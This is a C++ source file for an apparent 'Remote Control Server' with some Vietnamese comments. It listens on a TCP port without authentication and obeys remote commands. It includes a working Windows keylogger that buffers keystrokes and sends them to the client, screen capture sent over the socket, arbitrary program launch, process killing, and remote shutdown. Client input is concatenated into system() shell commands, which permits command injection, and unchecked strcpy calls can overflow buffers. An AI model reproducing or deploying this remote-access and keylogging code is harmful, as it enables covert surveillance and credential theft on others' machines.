#include "common.h"
#include <atomic>
#include <mutex>

#ifdef _WIN32
    #include <gdiplus.h>
    #pragma comment(lib, "gdiplus.lib")
#else
    #include <X11/Xlib.h>
    #include <X11/Xutil.h>
#endif

class RemoteServer {
private:
    SOCKET_TYPE serverSocket;
    SOCKET_TYPE clientSocket;
    std::atomic<bool> keyloggerActive;
    std::string keylogBuffer;
    std::mutex keylogMutex;
    std::thread keylogThread;
    
public:
    RemoteServer() : serverSocket(INVALID_SOCKET_VALUE), 
                     clientSocket(INVALID_SOCKET_VALUE),
                     keyloggerActive(false) {
        initWinsock();
    }
    
    ~RemoteServer() {
        stop();
        cleanupWinsock();
    }
    
    bool start() {
        // Create socket
        serverSocket = socket(AF_INET, SOCK_STREAM, 0);
        if (serverSocket == INVALID_SOCKET_VALUE) {
            std::cerr << "Failed to create socket" << std::endl;
            return false;
        }
        
        // Allow reuse of address
        int opt = 1;
        if (setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR, 
                      (char*)&opt, sizeof(opt)) < 0) {
            std::cerr << "Setsockopt failed" << std::endl;
            return false;
        }
        
        // Bind socket
        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_addr.s_addr = INADDR_ANY;
        serverAddr.sin_port = htons(PORT);
        
        if (bind(serverSocket, (struct sockaddr*)&serverAddr, 
                sizeof(serverAddr)) < 0) {
            std::cerr << "Bind failed" << std::endl;
            return false;
        }
        
        // Listen for connections
        if (listen(serverSocket, MAX_CLIENTS) < 0) {
            std::cerr << "Listen failed" << std::endl;
            return false;
        }
        
        std::cout << "Server started on port " << PORT << std::endl;
        std::cout << "Waiting for client connections..." << std::endl;
        
        return true;
    }
    
    void run() {
        while (true) {
            // Accept client connection
            sockaddr_in clientAddr;
            socklen_t clientLen = sizeof(clientAddr);
            
            clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientLen);
            if (clientSocket == INVALID_SOCKET_VALUE) {
                std::cerr << "Accept failed" << std::endl;
                continue;
            }
            
            std::cout << "Client connected from " 
                     << inet_ntoa(clientAddr.sin_addr) << std::endl;
            
            // Handle client commands
            handleClient();
            
            closesocket(clientSocket);
            clientSocket = INVALID_SOCKET_VALUE;
            std::cout << "Client disconnected" << std::endl;
        }
    }
    
    void handleClient() {
        Packet packet;
        
        while (receivePacket(clientSocket, packet)) {
            std::cout << "Received command: " << packet.command << std::endl;
            
            switch (packet.command) {
                case CMD_LIST_APPS:
                    handleListApps();
                    break;
                    
                case CMD_STOP_APP:
                    handleStopApp(packet.data);
                    break;
                    
                case CMD_START_APP:
                    handleStartApp(packet.data);
                    break;
                    
                case CMD_LIST_PROCESS:
                    handleListProcesses();
                    break;
                    
                case CMD_KILL_PROCESS:
                    handleKillProcess(atoi(packet.data));
                    break;
                    
                case CMD_SCREENSHOT:
                    handleScreenshot();
                    break;
                    
                case CMD_KEYLOG_START:
                    startKeylogger();
                    break;
                    
                case CMD_KEYLOG_STOP:
                    stopKeylogger();
                    break;
                    
                case CMD_KEYLOG_GET:
                    getKeylogData();
                    break;
                    
                case CMD_WEBCAM_ON:
                    handleWebcamOn();
                    break;
                    
                case CMD_WEBCAM_OFF:
                    handleWebcamOff();
                    break;
                    
                case CMD_SHUTDOWN:
                    handleShutdown();
                    break;
                    
                case CMD_RESTART:
                    handleRestart();
                    break;
                    
                case CMD_EXIT:
                    return;
                    
                default:
                    std::cout << "Unknown command: " << packet.command << std::endl;
                    break;
            }
        }
    }
    
    // Function 1: List running applications
    void handleListApps() {
        Packet response;
        response.command = CMD_LIST_APPS;
        std::string appList;
        
#ifdef _WIN32
        // Get list of windows
        HWND hwnd = GetTopWindow(NULL);
        while (hwnd) {
            if (IsWindowVisible(hwnd)) {
                char windowTitle[256];
                GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));
                if (strlen(windowTitle) > 0) {
                    appList += windowTitle;
                    appList += "\n";
                }
            }
            hwnd = GetNextWindow(hwnd, GW_HWNDNEXT);
        }
#else
        // Linux: List running applications using ps command
        FILE* pipe = popen("ps aux | grep -v grep | awk '{print $11}'", "r");
        if (pipe) {
            char buffer[256];
            while (fgets(buffer, sizeof(buffer), pipe)) {
                appList += buffer;
            }
            pclose(pipe);
        }
#endif
        
        strcpy(response.data, appList.c_str());
        response.dataSize = appList.length();
        sendPacket(clientSocket, response);
    }
    
    // Function 2: Stop an application
    void handleStopApp(const char* appName) {
        Packet response;
        response.command = CMD_STOP_APP;
        std::string result;
        
#ifdef _WIN32
        std::string cmd = "taskkill /F /IM " + std::string(appName) + ".exe";
        int ret = system(cmd.c_str());
        result = (ret == 0) ? "Application stopped successfully" : "Failed to stop application";
#else
        std::string cmd = "pkill -f " + std::string(appName);
        int ret = system(cmd.c_str());
        result = (ret == 0) ? "Application stopped successfully" : "Failed to stop application";
#endif
        
        strcpy(response.data, result.c_str());
        response.dataSize = result.length();
        sendPacket(clientSocket, response);
    }
    
    // Function 3: Start an application
    void handleStartApp(const char* appPath) {
        Packet response;
        response.command = CMD_START_APP;
        std::string result;
        
#ifdef _WIN32
        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        
        if (CreateProcessA(NULL, (LPSTR)appPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            result = "Application started successfully";
        } else {
            result = "Failed to start application";
        }
#else
        std::string cmd = std::string(appPath) + " &";
        int ret = system(cmd.c_str());
        result = (ret == 0) ? "Application started successfully" : "Failed to start application";
#endif
        
        strcpy(response.data, result.c_str());
        response.dataSize = result.length();
        sendPacket(clientSocket, response);
    }
    
    // Function 4: List processes (Task Manager)
    void handleListProcesses() {
        Packet response;
        response.command = CMD_LIST_PROCESS;
        std::string processList;
        
#ifdef _WIN32
        HANDLE hProcessSnap;
        PROCESSENTRY32 pe32;
        
        hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hProcessSnap == INVALID_HANDLE_VALUE) {
            processList = "Failed to get process list";
        } else {
            pe32.dwSize = sizeof(PROCESSENTRY32);
            
            if (Process32First(hProcessSnap, &pe32)) {
                do {
                    processList += "PID: " + std::to_string(pe32.th32ProcessID);
                    processList += " | Name: " + std::string(pe32.szExeFile);
                    
                    // Get memory usage
                    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 
                                                 FALSE, pe32.th32ProcessID);
                    if (hProcess != NULL) {
                        PROCESS_MEMORY_COUNTERS pmc;
                        if (GetProcessMemoryInfo(hProcess, &pmc, sizeof(pmc))) {
                            processList += " | Memory: " + std::to_string(pmc.WorkingSetSize / 1024 / 1024) + " MB";
                        }
                        CloseHandle(hProcess);
                    }
                    processList += "\n";
                    
                } while (Process32Next(hProcessSnap, &pe32));
            }
            CloseHandle(hProcessSnap);
        }
#else
        FILE* pipe = popen("ps aux", "r");
        if (pipe) {
            char buffer[256];
            while (fgets(buffer, sizeof(buffer), pipe)) {
                processList += buffer;
            }
            pclose(pipe);
        }
#endif
        
        strcpy(response.data, processList.c_str());
        response.dataSize = processList.length();
        sendPacket(clientSocket, response);
    }
    
    // Function 5: Kill a process
    void handleKillProcess(int pid) {
        Packet response;
        response.command = CMD_KILL_PROCESS;
        std::string result;
        
#ifdef _WIN32
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
        if (hProcess != NULL) {
            if (TerminateProcess(hProcess, 0)) {
                result = "Process terminated successfully";
            } else {
                result = "Failed to terminate process";
            }
            CloseHandle(hProcess);
        } else {
            result = "Failed to open process";
        }
#else
        if (kill(pid, SIGKILL) == 0) {
            result = "Process terminated successfully";
        } else {
            result = "Failed to terminate process";
        }
#endif
        
        strcpy(response.data, result.c_str());
        response.dataSize = result.length();
        sendPacket(clientSocket, response);
    }
    
// Function 6: Take screenshot
    void handleScreenshot() {
        Packet response;
        response.command = CMD_SCREENSHOT;
        std::string result_message;
        
#ifdef _WIN32
        // Windows screenshot implementation
        HDC hScreenDC = GetDC(NULL);
        HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
        
        int width = GetDeviceCaps(hScreenDC, HORZRES);
        int height = GetDeviceCaps(hScreenDC, VERTRES);
        
        HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
        HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
        
        BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
        hBitmap = (HBITMAP)SelectObject(hMemoryDC, hOldBitmap);
        
        // Save to file
        std::string filename = "screenshot_" + std::to_string(time(0)) + ".bmp";
        
        // --- (Code tạo file BMP của bạn vẫn giữ nguyên) ---
        BITMAPFILEHEADER bmfHeader;
        BITMAPINFOHEADER bi;
        
        bi.biSize = sizeof(BITMAPINFOHEADER);
        bi.biWidth = width;
        bi.biHeight = -height; // top-down
        bi.biPlanes = 1;
        bi.biBitCount = 24;
        bi.biCompression = BI_RGB;
        bi.biSizeImage = 0;
        bi.biXPelsPerMeter = 0;
        bi.biYPelsPerMeter = 0;
        bi.biClrUsed = 0;
        bi.biClrImportant = 0;
        
        DWORD dwBmpSize = ((width * bi.biBitCount + 31) / 32) * 4 * height;
        
        bmfHeader.bfType = 0x4D42;  // 'BM'
        bmfHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;
        bmfHeader.bfReserved1 = 0;
        bmfHeader.bfReserved2 = 0;
        bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
        
        char* lpbitmap = new char[dwBmpSize];
        GetDIBits(hScreenDC, hBitmap, 0, height, lpbitmap, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
        
        std::ofstream file(filename, std::ios::binary);
        file.write((char*)&bmfHeader, sizeof(BITMAPFILEHEADER));
        file.write((char*)&bi, sizeof(BITMAPINFOHEADER));
        file.write(lpbitmap, dwBmpSize);
        file.close();
        
        delete[] lpbitmap;
        
        // Clean up GDI objects
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        DeleteObject(hBitmap);

        // --- BẮT ĐẦU SỬA LOGIC ---
        
        // 2. Đọc file ảnh vừa lưu vào bộ nhớ
        std::ifstream imgFile(filename, std::ios::binary | std::ios::ate);
        if (imgFile.is_open()) {
            std::streamsize fileSize = imgFile.tellg();
            imgFile.seekg(0, std::ios::beg);

            if (fileSize > BUFFER_SIZE) {
                // 3a. Nếu file ảnh quá lớn, gửi lỗi
                result_message = "Screenshot failed: Image size is too large for buffer.";
                strcpy(response.data, result_message.c_str());
                response.dataSize = result_message.length();
            } else {
                // 3b. Đọc dữ liệu ảnh vào response.data
                imgFile.read(response.data, fileSize);
                response.dataSize = static_cast<int>(fileSize);
                // Gửi về dưới dạng dữ liệu nhị phân (ảnh BMP)
            }
            imgFile.close();

            // 4. Xóa file ảnh tạm
            DeleteFileA(filename.c_str());

        } else {
            result_message = "Screenshot failed: Could not read temp file.";
            strcpy(response.data, result_message.c_str());
            response.dataSize = result_message.length();
        }
        // --- KẾT THÚC SỬA LOGIC ---

#else
        // Linux screenshot (logic này vẫn lưu file, bạn có thể sửa tương tự)
        std::string filename = "screenshot_" + std::to_string(time(0)) + ".png";
        std::string cmd = "import -window root " + filename;
        int ret = system(cmd.c_str());
        
        std::string result = (ret == 0) ? 
            "Screenshot saved: " + filename : "Failed to take screenshot";
        
        // TODO: Đọc file "filename" và gửi về như logic của Windows ở trên
        // Tạm thời vẫn gửi text
        strcpy(response.data, result.c_str());
        response.dataSize = result.length();
#endif
        
        sendPacket(clientSocket, response);
    }
    
    // Function 7-9: Keylogger functions
    void startKeylogger() {
        if (!keyloggerActive) {
            keyloggerActive = true;
            keylogThread = std::thread(&RemoteServer::keyloggerLoop, this);
            
            Packet response;
            response.command = CMD_KEYLOG_START;
            std::string result = "Keylogger started";
            strcpy(response.data, result.c_str());
            response.dataSize = result.length();
            sendPacket(clientSocket, response);
        }
    }
    
    void stopKeylogger() {
        if (keyloggerActive) {
            keyloggerActive = false;
            if (keylogThread.joinable()) {
                keylogThread.join();
            }
            
            Packet response;
            response.command = CMD_KEYLOG_STOP;
            std::string result = "Keylogger stopped";
            strcpy(response.data, result.c_str());
            response.dataSize = result.length();
            sendPacket(clientSocket, response);
        }
    }
    
    void getKeylogData() {
        Packet response;
        response.command = CMD_KEYLOG_GET;
        
        std::lock_guard<std::mutex> lock(keylogMutex);
        if (keylogBuffer.length() >= BUFFER_SIZE) {
            // Cắt bớt chuỗi nếu quá dài
            // Copy (BUFFER_SIZE - 1) ký tự cuối cùng để xem log mới nhất
            std::string truncatedData = keylogBuffer.substr(keylogBuffer.length() - (BUFFER_SIZE - 1));
            strcpy(response.data, truncatedData.c_str());
            response.dataSize = truncatedData.length();
        } else {
            // Nếu an toàn thì copy bình thường
            strcpy(response.data, keylogBuffer.c_str());
            response.dataSize = keylogBuffer.length();
        }
        keylogBuffer.clear();
        
        sendPacket(clientSocket, response);
    }
    
    void keyloggerLoop() {
#ifdef _WIN32
        while (keyloggerActive) {
            for (int key = 8; key <= 255; key++) {
                if (GetAsyncKeyState(key) & 0x0001) {
                    std::lock_guard<std::mutex> lock(keylogMutex);
                    
                    // Special keys
                    if (key == VK_RETURN) {
                        keylogBuffer += "[ENTER]";
                    } else if (key == VK_SPACE) {
                        keylogBuffer += " ";
                    } else if (key == VK_BACK) {
                        keylogBuffer += "[BACKSPACE]";
                    } else if (key == VK_TAB) {
                        keylogBuffer += "[TAB]";
                    } else if (key == VK_ESCAPE) {
                        keylogBuffer += "[ESC]";
                    } else if (key >= 'A' && key <= 'Z') {
                        keylogBuffer += (char)key;
                    } else if (key >= '0' && key <= '9') {
                        keylogBuffer += (char)key;
                    } else {
                        keylogBuffer += "[" + std::to_string(key) + "]";
                    }
                }
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }
#else
        // Linux keylogger would require root privileges
        // Simplified version
        while (keyloggerActive) {
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
#endif
    }
    
    // Function 10-11: Webcam control (simplified)
    void handleWebcamOn() {
        Packet response;
        response.command = CMD_WEBCAM_ON;
        
#ifdef _WIN32
        // Use Windows Media Foundation or DirectShow
        std::string result = "Webcam turned on (feature requires additional implementation)";
#else
        // Use V4L2 or OpenCV
        std::string result = "Webcam turned on (feature requires additional implementation)";
#endif
        
        strcpy(response.data, result.c_str());
        response.dataSize = strlen(response.data);
        sendPacket(clientSocket, response);
    }
    
    void handleWebcamOff() {
        Packet response;
        response.command = CMD_WEBCAM_OFF;
        std::string result = "Webcam turned off";
        
        strcpy(response.data, result.c_str());
        response.dataSize = result.length();
        sendPacket(clientSocket, response);
    }
    
    // Function 12-13: System control
    void handleShutdown() {
        Packet response;
        response.command = CMD_SHUTDOWN;
        std::string result = "System shutting down...";
        
        strcpy(response.data, result.c_str());
        response.dataSize = result.length();
        sendPacket(clientSocket, response);
        
#ifdef _WIN32
        system("shutdown /s /t 10");
#else
        system("shutdown -h now");
#endif
    }
    
    void handleRestart() {
        Packet response;
        response.command = CMD_RESTART;
        std::string result = "System restarting...";
        
        strcpy(response.data, result.c_str());
        response.dataSize = result.length();
        sendPacket(clientSocket, response);
        
#ifdef _WIN32
        system("shutdown /r /t 10");
#else
        system("reboot");
#endif
    }
    
    void stop() {
        if (keyloggerActive) {
            stopKeylogger();
        }
        
        if (clientSocket != INVALID_SOCKET_VALUE) {
            closesocket(clientSocket);
        }
        
        if (serverSocket != INVALID_SOCKET_VALUE) {
            closesocket(serverSocket);
        }
    }
};

int main() {
    std::cout << "==================================" << std::endl;
    std::cout << "   Remote Control Server v1.0    " << std::endl;
    std::cout << "==================================" << std::endl;
    
    RemoteServer server;
    
    if (!server.start()) {
        std::cerr << "Failed to start server!" << std::endl;
        return 1;
    }
    
    try {
        server.run();
    } catch (const std::exception& e) {
        std::cerr << "Server error: " << e.what() << std::endl;
    }
    
    return 0;
}